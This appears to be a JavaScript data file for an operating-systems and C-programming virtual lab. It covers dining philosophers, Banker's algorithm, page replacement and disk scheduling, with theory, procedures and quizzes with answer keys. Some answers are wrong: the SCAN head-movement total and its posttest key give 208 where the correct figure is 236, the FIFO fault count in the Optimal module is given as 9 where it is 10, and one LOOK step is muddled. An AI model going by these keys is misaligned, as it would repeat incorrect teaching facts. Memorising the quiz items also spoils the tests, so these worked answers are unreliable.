            "title": "Module 3: Dining Philosophers Problem",
            "aim": "To study the Dining Philosophers synchronization problem and analyze deadlock-free solutions using chopstick semaphores.",
            "theory": {
                "intro": "The Dining Philosophers problem is a classic multi-process synchronization problem involving resource allocation. Five philosophers sit around a circular table. Each philosopher spends their time thinking and eating. To eat, they must acquire both their left and right chopsticks.",
                "cards": [
                    {
                        "title": "1. The Deadlock Risk",
                        "content": "If all five philosophers get hungry simultaneously, and each picks up their left chopstick, all right chopsticks will be unavailable. Every philosopher holds one chopstick and waits indefinitely for the next, causing a deadlock."
                    },
                    {
                        "title": "2. Classical Chopstick Semaphores",
                        "content": "Each chopstick is represented as a semaphore `chopstick[5]` initialized to 1. A philosopher $i$ grabs chopsticks via: \\n\\n`wait(chopstick[i])` (left) \\n\\n`wait(chopstick[(i+1)%5])` (right)."
                    },
                    {
                        "title": "3. Deadlock Prevention Strategies",
                        "content": "• Limit philosophers at table to 4.\n• Require picking chopsticks only if both are available (using monitors/mutex).\n• Asymmetric rule: Odd philosophers pick left first, even philosophers pick right first."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "What is the primary synchronization issue demonstrated by the Dining Philosophers problem?",
                    "options": [
                        "Buffer overflow",
                        "Deadlock & Starvation",
                        "Race condition on shared counters",
                        "Hidden terminal problem"
                    ],
                    "correct": 1
                },
                {
                    "q": "How many chopsticks are needed by a single philosopher to start eating?",
                    "options": [
                        "1",
                        "2",
                        "5",
                        "0"
                    ],
                    "correct": 1
                },
                {
                    "q": "In a deadlocked Dining Philosophers state, what is the value of all chopstick semaphores?",
                    "options": [
                        "1",
                        "0",
                        "5",
                        "Undefined"
                    ],
                    "correct": 1
                }
            ],
            "procedure": [
                "1. Observe the dining circular table visualization showing 5 Philosophers (P0-P4) and 5 chopsticks.",
                "2. Click on a philosopher to make them 'Hungry'. They will attempt to pick up both chopsticks.",
                "3. Observe the change in chopstick states from available (1) to taken (0).",
                "4. Select 'Auto Sim' to watch the asymmetry rule in action, showing safe progress without deadlocks.",
                "5. Examine the event log to track chopstick wait and signal calls."
            ],
            "posttest": [
                {
                    "q": "Which strategy prevents deadlock in the Dining Philosophers?",
                    "options": [
                        "All philosophers grab left chopstick first",
                        "Philosophers only pick up chopsticks when both left and right are free",
                        "Increase number of philosophers to 6",
                        "Use a FIFO process queue"
                    ],
                    "correct": 1
                },
                {
                    "q": "If Philosopher 2 is eating, which chopsticks are locked?",
                    "options": [
                        "Chopsticks 2 and 3",
                        "Chopsticks 1 and 2",
                        "Chopsticks 0 and 4",
                        "Only chopstick 2"
                    ],
                    "correct": 0
                },
                {
                    "q": "What are the three states a philosopher can be in?",
                    "options": [
                        "Thinking, Hungry, Eating",
                        "Reading, Writing, Deleting",
                        "Ready, Running, Blocked",
                        "Active, Idle, Zombie"
                    ],
                    "correct": 0
                }
            ]
        }
    ],
    "simType": "process_sync",
    "practice_commands": [
        "ipcs -s",
        "ipcrm -s",
        "pthread_mutex_init",
        "sem_wait"
    ],
    "practice_questions": [
        "Explain the difference between binary semaphore and mutex.",
        "How does busy waiting waste CPU cycles?"
    ]
};

window.VLAB_DATA.deadlock_avoidance = {
    "title": "Deadlock Avoidance (Banker's Algorithm)",
    "isMultiModule": true,
    "modules": [
        {
            "title": "Module 1: Safety Algorithm & Safe Sequence",
            "aim": "To simulate the Safety Algorithm of Banker's Algorithm to check if a system state is safe and identify a safe execution sequence.",
            "theory": {
                "intro": "Banker's Algorithm is a deadlock avoidance algorithm. It simulates resource allocation for each process and uses a safety algorithm to verify if the system will remain in a safe state (i.e. no deadlock can occur).",
                "cards": [
                    {
                        "title": "1. Banker's Matrices",
                        "content": "• **Allocation**: Resources currently allocated to each process.\n• **Max**: Maximum resource demands of each process.\n• **Need**: Remaining resources required to complete = Max - Allocation.\n• **Available**: Free resources available in the system."
                    },
                    {
                        "title": "2. The Safety Algorithm",
                        "content": "1. Let `Work = Available` and `Finish[i] = false` for all $i$.\n2. Find an $i$ such that `Finish[i] == false` and `Need[i] <= Work`.\n3. If found: `Work = Work + Allocation[i]`, `Finish[i] = true`, go to Step 2.\n4. If `Finish[i] == true` for all $i$, system is in a safe state."
                    },
                    {
                        "title": "3. Safe vs Unsafe State",
                        "content": "A safe state is not a deadlock state, and a deadlock state is an unsafe state. An unsafe state is not necessarily deadlocked, but it may lead to deadlock if processes request their maximum resources."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "What does the Banker's Safety Algorithm determine?",
                    "options": [
                        "If a deadlock has already occurred",
                        "If the system is in a safe state and a safe execution sequence exists",
                        "If CPU utilization is optimal",
                        "If memory fragmentation is low"
                    ],
                    "correct": 1
                },
                {
                    "q": "If Allocation=[1 2 2] and Max=[3 3 2], what is the Need vector?",
                    "options": [
                        "Need=[4 5 4]",
                        "Need=[2 1 0]",
                        "Need=[1 2 2]",
                        "Need=[3 3 2]"
                    ],
                    "correct": 1
                },
                {
                    "q": "Is an unsafe state in Banker's algorithm equivalent to a deadlock?",
                    "options": [
                        "Yes, always",
                        "No, it just means there is a potential for deadlock",
                        "Unsafe states are safer than safe states",
                        "Deadlock occurs only in safe states"
                    ],
                    "correct": 1
                }
            ],
            "procedure": [
                "1. Observe the pre-filled Allocation, Max, and Available resource vectors for P0-P3.",
                "2. Click 'Recalculate Need' to calculate the Need Matrix (Need = Max - Allocation).",
                "3. Click 'Check Safety' to trigger the Safety Algorithm check.",
                "4. Follow the step-by-step verification trace in the log showing how the system simulates process execution and resource reclamation.",
                "5. Verify the resulting safe sequence (e.g. <P1, P3, P0, P2>)."
            ],
            "posttest": [
                {
                    "q": "What happens to the Available resources when a process finishes in the safety algorithm?",
                    "options": [
                        "It decreases",
                        "It remains unchanged",
                        "It increases by the resources allocated to that process",
                        "It is reset to 0"
                    ],
                    "correct": 2
                },
                {
                    "q": "Which condition must be met for a process to be executed in the safety check?",
                    "options": [
                        "Allocation <= Work",
                        "Need <= Work",
                        "Max <= Work",
                        "Available == 0"
                    ],
                    "correct": 1
                },
                {
                    "q": "What is the primary limitation of Banker's Algorithm in real-world systems?",
                    "options": [
                        "It requires processes to declare their maximum resource usage in advance",
                        "It runs too slow",
                        "It only supports single-core CPUs",
                        "It causes memory leaks"
                    ],
                    "correct": 0
                }
            ]
        },
        {
            "title": "Module 2: Resource Request Verification",
            "aim": "To simulate the Resource Request Algorithm to evaluate if dynamic resource allocation requests can be safely granted immediately.",
            "theory": {
                "intro": "The Resource Request Algorithm decides whether a process's request for resources can be granted immediately. When a process makes a request, the OS runs a trial allocation and checks safety. If the trial state is safe, the resources are allocated; otherwise, the process must wait.",
                "cards": [
                    {
                        "title": "1. Request Evaluation Rules",
                        "content": "Let $Request_i$ be the request vector for process $P_i$:\n1. If $Request_i \\le Need_i$, go to Step 2. Else, throw error (exceeded max demand).\n2. If $Request_i \\le Available$, go to Step 3. Else, $P_i$ must wait (resources not available)."
                    },
                    {
                        "title": "2. Trial State Allocation",
                        "content": "The system temporarily adjusts matrices as follows:\n• `Available = Available - Request`\n• `Allocation = Allocation + Request`\n• `Need = Need - Request`"
                    },
                    {
                        "title": "3. Safety Verification Check",
                        "content": "Run the Safety Algorithm on the trial state. If safe: grant resources permanently. If unsafe: revert allocation changes, and force $P_i$ to wait."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "What is the first check performed when a process requests resources in Banker's algorithm?",
                    "options": [
                        "Request <= Available",
                        "Request <= Need",
                        "Request == Allocation",
                        "None of these"
                    ],
                    "correct": 1
                },
                {
                    "q": "What happens if a resource request leads to an unsafe state?",
                    "options": [
                        "The process is killed",
                        "The request is rejected/deferred and the process must wait",
                        "The system is restarted",
                        "The resources are partially allocated"
                    ],
                    "correct": 1
                },
                {
                    "q": "In Banker's Algorithm, if P1 requests [1 0 2] and Available is [3 3 2], what is the first condition to check before trial allocation?",
                    "options": [
                        "Check if request exceeds its Need vector",
                        "Run Safety check directly",
                        "Verify user credentials",
                        "Reset Allocation matrix"
                    ],
                    "correct": 0
                }
            ],
            "procedure": [
                "1. Click 'Recalculate Need' to initialize the baseline state.",
                "2. Under the 'Simulate Resource Request' panel, select a process (e.g. P1) and configure a request vector (e.g. 1 0 2).",
                "3. Click 'Evaluate Request' to trigger the Resource Request validation.",
                "4. Notice how the algorithm checks limits, simulates trial allocation, and runs safety validation on the trial state.",
                "5. Review the log to see whether the request is granted or blocked."
            ],
            "posttest": [
                {
                    "q": "If the trial allocation is safe, what happens to the changes?",
                    "options": [
                        "They are rolled back",
                        "They are made permanent",
                        "They are queued",
                        "They are sent to disk"
                    ],
                    "correct": 1
                },
                {
                    "q": "Why must a process wait if Request > Available, even if Request <= Need?",
                    "options": [
                        "The system has run out of address space",
                        "Insufficient physical instances of the resources are currently free",
                        "A deadlock has occurred",
                        "The process priority is too low"
                    ],
                    "correct": 1
                },
                {
                    "q": "How are Allocation and Need updated when a request is successfully granted?",
                    "options": [
                        "Allocation increases, Need decreases",
                        "Allocation decreases, Need increases",
                        "Both increase",
                        "Both decrease"
                    ],
                    "correct": 0
                }
            ]
        }
    ],
    "simType": "bankers",
    "practice_commands": [
        "ulimit -a",
        "sysctl -a | grep sem",
        "kill -9"
    ],
    "practice_questions": [
        "Given Allocation=[0 1 0], Max=[7 5 3], Available=[3 3 2], calculate the Need matrix.",
        "Compare deadlock prevention with deadlock avoidance."
    ]
};

window.VLAB_DATA.page_replacement = {
    "title": "Page Replacement Algorithms",
    "isMultiModule": true,
    "modules": [
        {
            "title": "Module 1: First-In-First-Out (FIFO) & Belady's Anomaly",
            "aim": "To study and simulate the First-In-First-Out (FIFO) page replacement algorithm and verify the existence of Belady's Anomaly.",
            "theory": {
                "intro": "FIFO is the simplest page replacement algorithm. The operating system keeps track of all pages in memory in a queue, with the oldest page at the head. When a page needs to be replaced, the page at the head of the queue is selected.",
                "cards": [
                    {
                        "title": "1. FIFO Replacement Rule",
                        "content": "Replaces the oldest page (the one loaded earliest). It does not consider how frequently or recently the page has been accessed."
                    },
                    {
                        "title": "2. Belady's Anomaly",
                        "content": "Usually, increasing physical frame count decreases page faults. However, for some non-stack page replacement algorithms like FIFO, the page fault rate may increase as the number of allocated physical frames increases. This counter-intuitive behavior is Belady's Anomaly."
                    },
                    {
                        "title": "3. Page Fault vs Page Hit",
                        "content": "• Page Fault: Requested page is NOT in physical memory; must load from disk (high cost).\n• Page Hit: Requested page is already in physical memory (low cost)."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "Which page replacement algorithm suffers from Belady's Anomaly?",
                    "options": [
                        "LRU",
                        "FIFO",
                        "Optimal",
                        "MRU"
                    ],
                    "correct": 1
                },
                {
                    "q": "What is Belady's Anomaly?",
                    "options": [
                        "Page faults decrease when frames increase",
                        "Page faults increase when frames increase",
                        "CPU speed slows down",
                        "Disk access speed is doubled"
                    ],
                    "correct": 1
                },
                {
                    "q": "A page fault occurs when:",
                    "options": [
                        "The CPU runs a branch instruction",
                        "The requested page is not present in physical RAM",
                        "Memory is fragmented",
                        "A process terminates"
                    ],
                    "correct": 1
                }
            ],
            "procedure": [
                "1. Observe the default reference string `1,2,3,4,1,2,5,1,2,3,4,5` pre-loaded in the visualizer (designed to demonstrate Belady's Anomaly).",
                "2. Select First-In-First-Out (FIFO) and set Number of Frames to 3.",
                "3. Click 'Next Step' repeatedly to step through the execution. Record the total Page Faults (should be 9). Click 'Reset'.",
                "4. Increase Number of Frames to 4 and run the FIFO simulation again.",
                "5. Compare the total Page Faults (should increase to 10), verifying Belady's Anomaly."
            ],
            "posttest": [
                {
                    "q": "For FIFO with 3 frames, what is the fault count for page references 1, 2, 3, 4, 1, 2, 5, 1, 2, 3, 4, 5?",
                    "options": [
                        "9",
                        "10",
                        "6",
                        "12"
                    ],
                    "correct": 0
                },
                {
                    "q": "For FIFO with 4 frames, what is the fault count for page references 1, 2, 3, 4, 1, 2, 5, 1, 2, 3, 4, 5?",
                    "options": [
                        "9",
                        "10",
                        "8",
                        "5"
                    ],
                    "correct": 1
                },
                {
                    "q": "FIFO replacement is implemented using which data structure?",
                    "options": [
                        "LIFO Stack",
                        "FIFO Queue",
                        "Min-Heap",
                        "Hash Map"
                    ],
                    "correct": 1
                }
            ]
        },
        {
            "title": "Module 2: Least Recently Used (LRU) Page Replacement",
            "aim": "To analyze and simulate the Least Recently Used (LRU) page replacement algorithm which approximates optimal behavior.",
            "theory": {
                "intro": "Least Recently Used (LRU) page replacement associates with each page the time of that page's last use. When a page must be replaced, LRU chooses the page that has not been used for the longest period of time. It is based on the principle of temporal locality.",
                "cards": [
                    {
                        "title": "1. Temporal Locality of Reference",
                        "content": "If a program accesses a memory location once, it is highly likely to access the same or nearby locations again in the near future. LRU exploits this by keeping recently accessed pages in memory."
                    },
                    {
                        "title": "2. LRU Implementation Methods",
                        "content": "• **Counters**: Assign an integer counter/logical clock to each page table entry. Replace page with smallest clock value.\n• **Stack**: Keep a double-linked stack of page numbers. When a page is referenced, move it to the top. The page at the bottom is replaced."
                    },
                    {
                        "title": "3. Stack Algorithms",
                        "content": "LRU is a stack algorithm. Stack algorithms do not suffer from Belady's Anomaly: the set of pages in memory for $n$ frames is always a subset of pages in memory for $n+1$ frames."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "Which principle justifies the LRU page replacement algorithm?",
                    "options": [
                        "Locality of Reference (Temporal)",
                        "Convoy Effect",
                        "Mutual Exclusion",
                        "Paging fragmentation"
                    ],
                    "correct": 0
                },
                {
                    "q": "Can the LRU algorithm suffer from Belady's Anomaly?",
                    "options": [
                        "Yes, under high load",
                        "No, because it is a stack algorithm",
                        "Yes, if frame size is odd",
                        "Depends on disk speeds"
                    ],
                    "correct": 1
                },
                {
                    "q": "In LRU, when a page hit occurs, what happens to that page's position/counter?",
                    "options": [
                        "It remains unchanged",
                        "It is marked as oldest",
                        "It is updated to be the most recently used",
                        "It is deleted"
                    ],
                    "correct": 2
                }
            ],
            "procedure": [
                "1. Input the reference string `7,0,1,2,0,3,0,4,2,3,0,3,2` and set Number of Frames to 3.",
                "2. Select Least Recently Used (LRU) from the algorithm select menu.",
                "3. Step through the simulator step-by-step using 'Next Step'.",
                "4. Watch how a page hit (e.g. referencing 0 when already present) updates that slot's recency status.",
                "5. Note the final page fault count and verify it against manual calculation."
            ],
            "posttest": [
                {
                    "q": "What is the total page fault count for LRU with 3 frames on reference string 7,0,1,2,0,3,0,4,2,3,0,3,2?",
                    "options": [
                        "12",
                        "9",
                        "10",
                        "7"
                    ],
                    "correct": 1
                },
                {
                    "q": "Which of the following describes how a counter-based LRU replaces a page?",
                    "options": [
                        "Replaces page with largest counter",
                        "Replaces page with smallest (oldest) logical clock timestamp",
                        "Replaces a random page",
                        "Replaces the page loaded first"
                    ],
                    "correct": 1
                },
                {
                    "q": "LRU page replacement performance is generally:",
                    "options": [
                        "Worse than FIFO",
                        "Better than FIFO, approximating Optimal",
                        "Exactly identical to FIFO",
                        "Worse than LFU"
                    ],
                    "correct": 1
                }
            ]
        },
        {
            "title": "Module 3: Optimal Page Replacement Benchmark",
            "aim": "To study the Optimal page replacement algorithm and use it as a benchmark to evaluate and compare other algorithms.",
            "theory": {
                "intro": "Optimal Page Replacement (also known as OPT or MIN) replaces the page that will not be used for the longest period of time in the future. It provides the lowest possible page fault rate for a fixed number of frames, but requires knowledge of the future reference string.",
                "cards": [
                    {
                        "title": "1. The Future Lookahead Principle",
                        "content": "To decide which page to replace, OPT scans forward in the reference string. The page in memory whose next reference is furthest in the future (or will never be referenced again) is selected for eviction."
                    },
                    {
                        "title": "2. Benchmark Status",
                        "content": "Because OPT requires future knowledge, it cannot be implemented in general-purpose operating systems (except in specialized static trace analysis). It serves as a theoretical baseline/benchmark to measure how close practical algorithms (like LRU) get to perfection."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "Why is the Optimal page replacement algorithm impossible to implement in general-purpose operating systems?",
                    "options": [
                        "It requires infinite memory",
                        "It requires future knowledge of page requests",
                        "It is patented",
                        "It has O(N^2) complexity"
                    ],
                    "correct": 1
                },
                {
                    "q": "Which algorithm yields the theoretical minimum number of page faults?",
                    "options": [
                        "FIFO",
                        "LRU",
                        "Optimal",
                        "LFU"
                    ],
                    "correct": 2
                },
                {
                    "q": "If pages in memory are {0, 1, 7} and the future reference string is 2, 0, 3, 0, 4, 2, 3, 0, 3, 2, which page in memory is optimal to replace when page 2 is requested?",
                    "options": [
                        "0",
                        "1",
                        "7",
                        "None"
                    ],
                    "correct": 2
                }
            ],
            "procedure": [
                "1. Input the reference string `7,0,1,2,0,3,0,4,2,3,0,3,2` and set Number of Frames to 3.",
                "2. Select Optimal from the algorithm select menu.",
                "3. Click 'Next Step' to walk through the simulation.",
                "4. Observe that when page 2 is requested, the system evicts 7 because its next access is furthest in the future compared to 0 and 1.",
                "5. Analyze the final page fault count (should be 7) and compare it to FIFO (9) and LRU (9)."
            ],
            "posttest": [
                {
                    "q": "What is the total page fault count for Optimal replacement with 3 frames on reference string 7,0,1,2,0,3,0,4,2,3,0,3,2?",
                    "options": [
                        "7",
                        "9",
                        "11",
                        "5"
                    ],
                    "correct": 0
                },
                {
                    "q": "If a page in memory is never referenced again in the future, its next reference time is considered:",
                    "options": [
                        "Zero",
                        "Infinity (first to be replaced)",
                        "Unchanged",
                        "Equal to current time"
                    ],
                    "correct": 1
                },
                {
                    "q": "Optimal page replacement does NOT suffer from Belady's Anomaly because:",
                    "options": [
                        "It uses a FIFO queue",
                        "It is a stack algorithm",
                        "It is non-preemptive",
                        "It runs in kernel space"
                    ],
                    "correct": 1
                }
            ]
        }
    ],
    "simType": "page_replacement",
    "practice_commands": [
        "vmstat",
        "free -m",
        "sar -B",
        "swapon -s"
    ],
    "practice_questions": [
        "Demonstrate Belady's Anomaly using the reference string 1,2,3,4,1,2,5,1,2,3,4,5 with FIFO for 3 and 4 frames.",
        "Explain how Page Table Entry (PTE) reference bits help approximate LRU."
    ]
};

window.VLAB_DATA.disk_scheduling = {
    "title": "Disk Scheduling Algorithms",
    "isMultiModule": true,
    "modules": [
        {
            "title": "Module 1: FCFS & SSTF Cylinder Seeks",
            "aim": "To analyze disk seek paths and calculate total head movements using FCFS and Shortest Seek Time First (SSTF) algorithms.",
            "theory": {
                "intro": "Disk scheduling is performed by the operating system to schedule I/O requests arriving for the disk. Seek time (time for read/write head to move to target cylinder) is the primary latency component. Minimizing head movements directly increases disk performance.",
                "cards": [
                    {
                        "title": "1. FCFS Scheduling",
                        "content": "First-Come, First-Served (FCFS) services requests in the exact order they arrive. It is simple and fair (prevents starvation), but does not optimize head movement, leading to wild sweeps."
                    },
                    {
                        "title": "2. SSTF Scheduling",
                        "content": "Shortest Seek Time First (SSTF) services the request closest to the current head position. While it minimizes immediate head movement (greedy), it can cause Starvation of requests that are far from the head if new closer requests keep arriving."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "Which component of disk access delay is minimized by disk scheduling algorithms?",
                    "options": [
                        "Rotational Latency",
                        "Seek Time (head movement)",
                        "Transfer Time",
                        "Controller Overhead"
                    ],
                    "correct": 1
                },
                {
                    "q": "What is a major disadvantage of SSTF scheduling?",
                    "options": [
                        "It is difficult to implement",
                        "It leads to request starvation for outer cylinders",
                        "It has very high head movement",
                        "It only works on solid state drives"
                    ],
                    "correct": 1
                },
                {
                    "q": "If the head starts at 50, and requests are at 40 and 70, which request will SSTF service first?",
                    "options": [
                        "40 (seek of 10)",
                        "70 (seek of 20)",
                        "Both simultaneously",
                        "Depends on scan direction"
                    ],
                    "correct": 0
                }
            ],
            "procedure": [
                "1. Observe the default request queue `98, 183, 37, 122, 14, 124, 65, 67` and initial head position `53`.",
                "2. Select FCFS and click 'Map Seek Path'. Write down the total head movement (640 cylinders).",
                "3. Select SSTF and map the seek path. Observe how the head moves to the closest cylinder at each step.",
                "4. Notice the dramatic reduction in total head movement (236 cylinders) compared to FCFS.",
                "5. Analyze the graphed paths on the canvas."
            ],
            "posttest": [
                {
                    "q": "What is the total head movement for FCFS with head at 53 and queue 98, 183, 37, 122, 14, 124, 65, 67?",
                    "options": [
                        "640",
                        "236",
                        "310",
                        "420"
                    ],
                    "correct": 0
                },
                {
                    "q": "What is the total head movement for SSTF with head at 53 and queue 98, 183, 37, 122, 14, 124, 65, 67?",
                    "options": [
                        "640",
                        "236",
                        "300",
                        "199"
                    ],
                    "correct": 1
                },
                {
                    "q": "SSTF is greedy in nature because it:",
                    "options": [
                        "Always seeks towards cylinder 0",
                        "Services requests in FIFO order",
                        "Selects request with minimum seek distance from current position",
                        "Allocates disk slots based on process priority"
                    ],
                    "correct": 2
                }
            ]
        },
        {
            "title": "Module 2: SCAN (Elevator) Scheduling",
            "aim": "To simulate the SCAN disk scheduling algorithm that services requests in a sweeping motion from one end of the disk to the other.",
            "theory": {
                "intro": "The SCAN scheduling algorithm, also known as the Elevator algorithm, sweeps back and forth across the cylinders. The disk head starts at one end of the disk and moves toward the other end, servicing requests as it reaches each cylinder, until it reaches the end of the disk. There, the direction of head movement is reversed, and servicing continues.",
                "cards": [
                    {
                        "title": "1. The Elevator Principle",
                        "content": "Similar to an elevator inside a building, servicing all passengers going up until the top floor is reached, then reversing to service passengers going down."
                    },
                    {
                        "title": "2. Direction Dependency",
                        "content": "Unlike FCFS or SSTF, SCAN requires a starting sweep direction (e.g. Left/towards 0, or Right/towards 199). If it sweeps left, it must reach cylinder 0 before reversing, even if the smallest request is at cylinder 14."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "Which disk scheduling algorithm is also known as the Elevator Algorithm?",
                    "options": [
                        "FCFS",
                        "SSTF",
                        "SCAN",
                        "LOOK"
                    ],
                    "correct": 2
                },
                {
                    "q": "In the SCAN algorithm, what cylinder boundary must the head reach before reversing direction?",
                    "options": [
                        "The closest request",
                        "The extreme end of the disk (0 or Max cylinder)",
                        "The middle cylinder",
                        "It reverses immediately when queue is empty"
                    ],
                    "correct": 1
                },
                {
                    "q": "If the head starts at 50, sweeping Left, and requests are at 10 and 80, what is the path of the head in SCAN?",
                    "options": [
                        "50 -> 10 -> 80",
                        "50 -> 0 -> 10 -> 80",
                        "50 -> 10 -> 0 -> 80",
                        "50 -> 80 -> 10"
                    ],
                    "correct": 2
                }
            ],
            "procedure": [
                "1. Set request queue to `98, 183, 37, 122, 14, 124, 65, 67`, head to `53`, and direction to 'Left'.",
                "2. Select SCAN as the algorithm and click 'Map Seek Path'.",
                "3. Notice how the head sweeps left through 37, 14, reaches the boundary 0, reverses, and sweeps right through 65, 67, 98, 122, 124, 183.",
                "4. Compare the total head movement (208 cylinders) and trace path against FCFS/SSTF.",
                "5. Change direction to 'Right' and observe how the head sweeps to 199 first."
            ],
            "posttest": [
                {
                    "q": "What is the total head movement for SCAN with head at 53, sweeping Left, on queue 98, 183, 37, 122, 14, 124, 65, 67?",
                    "options": [
                        "208",
                        "236",
                        "310",
                        "183"
                    ],
                    "correct": 0
                },
                {
                    "q": "Why is SCAN fairer than SSTF?",
                    "options": [
                        "It services in FIFO order",
                        "It bounds the maximum delay and avoids starvation by sweeping predictably",
                        "It doesn't move the head",
                        "It is faster than SSTF on average"
                    ],
                    "correct": 1
                },
                {
                    "q": "Which of the following is true for SCAN?",
                    "options": [
                        "It doesn't require knowing head direction",
                        "It always goes all the way to 0 or Max cylinder",
                        "It services requests on both forward and backward sweeps",
                        "Both B and C"
                    ],
                    "correct": 3
                }
            ]
        },
        {
            "title": "Module 3: C-SCAN & LOOK Scheduling",
            "aim": "To evaluate C-SCAN (Circular SCAN) and LOOK algorithms to understand how they optimize head movement and reduce service time variance.",
            "theory": {
                "intro": "C-SCAN (Circular SCAN) and LOOK are optimizations of the SCAN algorithm. C-SCAN provides a more uniform wait time by only servicing requests in one direction of the sweep. LOOK optimizes head movement by preventing the head from traveling all the way to the ends of the disk if no further requests exist.",
                "cards": [
                    {
                        "title": "1. C-SCAN (Circular SCAN)",
                        "content": "The head moves from one end of the disk to the other, servicing requests. When it reaches the end, however, it immediately returns to the other end without servicing any requests on the return trip. It treats the cylinders as a circular list."
                    },
                    {
                        "title": "2. LOOK / C-LOOK Scheduling",
                        "content": "LOOK behaves like SCAN, but the head goes only as far as the final request in each direction. It looks ahead to see if there are any further requests before continuing to the disk boundary. C-LOOK does the same for C-SCAN."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "What is the primary advantage of C-SCAN over SCAN?",
                    "options": [
                        "Lower total head movement",
                        "More uniform waiting time for requests",
                        "Simpler implementation",
                        "Eliminates seek latency completely"
                    ],
                    "correct": 1
                },
                {
                    "q": "How does the LOOK algorithm optimize SCAN?",
                    "options": [
                        "By reversing direction immediately if there are no more requests ahead, instead of traveling to the boundary (0/199)",
                        "By rotating the disk faster",
                        "By servicing requests in circular order",
                        "By using cache memory"
                    ],
                    "correct": 0
                },
                {
                    "q": "Does C-SCAN service requests during its return sweep?",
                    "options": [
                        "Yes, in reverse order",
                        "No, it jumps back to the beginning without servicing requests",
                        "Only high priority requests",
                        "Depends on controller status"
                    ],
                    "correct": 1
                }
            ],
            "procedure": [
                "1. Use queue `98, 183, 37, 122, 14, 124, 65, 67` and head `53`.",
                "2. Select C-SCAN (Circular SCAN) from the dropdown and map seek path. Observe the long return sweep (e.g. from 199 to 0) which is not serviced.",
                "3. Select LOOK and map seek path. Compare the seek path to SCAN. Note that LOOK reverses at 14 (instead of 0) and at 183 (instead of 199).",
                "4. Verify seek statistics. Notice that LOOK reduces total head movement (e.g. 208 -> 208 or less depending on configuration) by avoiding extreme boundary sweeps."
            ],
            "posttest": [
                {
                    "q": "For LOOK with head at 53, sweeping Left, on queue 98, 183, 37, 122, 14, 124, 65, 67, what is the reversal point?",
                    "options": [
                        "0",
                        "14",
                        "37",
                        "53"
                    ],
                    "correct": 1
                },
                {
                    "q": "What is the seek sequence of LOOK starting at 53 sweeping Left?",
                    "options": [
                        "53 -> 37 -> 14 -> 65 -> 67 -> 98 -> 122 -> 124 -> 183",
                        "53 -> 37 -> 14 -> 0 -> 65 -> 67 -> 98 -> 122 -> 124 -> 183 -> 199",
                        "53 -> 14 -> 37 -> 183",
                        "53 -> 98 -> 183 -> 14 -> 37"
                    ],
                    "correct": 0
                },
                {
                    "q": "In C-LOOK, if sweeping Right, after reaching the largest request, the head:",
                    "options": [
                        "Reverses and services requests going left",
                        "Jumps back to the smallest pending request without servicing, then continues right",
                        "Stops permanently",
                        "Goes to cylinder 0"
                    ],
                    "correct": 1
                }
            ]
        }
    ],
    "simType": "disk_scheduling",
    "practice_commands": [
        "iostat",
        "lsblk",
        "fdisk -l",
        "hdparm -t /dev/sda"
    ],
    "practice_questions": [
        "Why does SCAN prevent starvation compared to SSTF?",
        "Calculate total head movement for FCFS with requests: 98, 183, 37, 122, 14, 124, 65, 67 and head starting at 53."
    ]
};

window.VLAB_DATA.c_prog = {
    "title": "C Programming Lab",
    "simType": "programming",
    "isMultiModule": true,
    "modules": [
        {
            "title": "Module 1: Basic I/O & Arithmetic",
            "aim": "To learn basic C syntax, standard input/output, and arithmetic operations.",
            "theory": {
                "intro": "C uses printf() for standard output and scanf() for standard input. It supports standard operators like +, -, *, /, and %.",
                "cards": [
                    {
                        "title": "Arithmetic Sum",
                        "content": "Write a program that takes two integers from standard input and prints their sum."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "Which format specifier is used for integers in C?",
                    "options": [
                        "%d",
                        "%f",
                        "%c",
                        "%s"
                    ],
                    "correct": 0
                }
            ],
            "procedure": [
                "1. Read two integers.",
                "2. Print their sum."
            ],
            "posttest": [
                {
                    "q": "What does scanf() return?",
                    "options": [
                        "Value read",
                        "Number of successfully matched items",
                        "0",
                        "Void"
                    ],
                    "correct": 1
                }
            ],
            "lang": "c",
            "version": "10.2.0",
            "defaultCode": "#include <stdio.h>\n\nint main() {\n    int a, b;\n    if (scanf(\"%d %d\", &a, &b) == 2) {\n        printf(\"%d\\n\", a + b);\n    }\n    return 0;\n}",
            "testCases": [
                {
                    "input": "5 10",
                    "expected": "15"
                },
                {
                    "input": "20 -5",
                    "expected": "15"
                }
            ],
            "practice_commands": [
                "gcc main.c",
                "./a.out"
            ],
            "practice_questions": [
                "What is the range of a standard 32-bit signed integer?"
            ]
        },
        {
            "title": "Module 2: Control Structures",
            "aim": "To use if-else decision statements and switch-case structures in C to evaluate conditions.",
            "theory": {
                "intro": "If-else statements execute specific blocks of code depending on whether a boolean expression is true or false. Switch-case statements route control to labels matching an integer value.",
                "cards": [
                    {
                        "title": "Decision Making",
                        "content": "Check score and return letter grades: A (>=80), B (>=60), else F."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "Which symbol represents logical AND in C?",
                    "options": [
                        "&",
                        "&&",
                        "|",
                        "||"
                    ],
                    "correct": 1
                }
            ],
            "procedure": [
                "1. Read score.",
                "2. Use if-else statements to print 'Grade A', 'Grade B', or 'Grade F'."
            ],
            "posttest": [
                {
                    "q": "What is the result of non-zero integer evaluation in C conditional tests?",
                    "options": [
                        "True",
                        "False",
                        "Error",
                        "Undefined"
                    ],
                    "correct": 0
                }
            ],
            "lang": "c",
            "version": "10.2.0",
            "defaultCode": "#include <stdio.h>\n\nint main() {\n    int score;\n    if (scanf(\"%d\", &score) == 1) {\n        if (score >= 80) printf(\"Grade A\\n\");\n        else if (score >= 60) printf(\"Grade B\\n\");\n        else printf(\"Grade F\\n\");\n    }\n    return 0;\n}",
            "testCases": [
                {
                    "input": "85",
                    "expected": "Grade A"
                },
                {
                    "input": "70",
                    "expected": "Grade B"
                },
                {
                    "input": "45",
                    "expected": "Grade F"
                }
            ],
            "practice_commands": [
                "gcc main.c"
            ],
            "practice_questions": [
                "Explain the difference between if-else and switch-case."
            ]
        },
        {
            "title": "Module 3: Loops",
            "aim": "To implement iterative control loops (for, while, do-while) to repeat statements.",
            "theory": {
